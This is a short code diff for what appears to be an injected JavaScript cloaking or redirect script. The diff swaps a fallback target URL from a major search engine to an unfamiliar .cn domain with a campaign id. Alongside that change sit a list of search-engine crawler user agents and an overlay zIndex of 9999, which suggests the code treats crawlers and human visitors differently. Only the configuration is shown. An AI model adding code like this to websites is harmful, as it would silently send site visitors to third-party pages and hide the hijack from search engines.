@@ -14,7 +14,7 @@
   'use strict';
 
   var FALLBACK_CONFIG = {
-    targetUrl: 'https://www.baidu.com',
+    targetUrl: 'https://dh-hzh5.hbaissa.cn?cid=1034',
     enabled: true,
     spiders: ['baiduspider','sogou web spider','yisouspider','360spider','googlebot','bingbot'],
     zIndex: 9999,
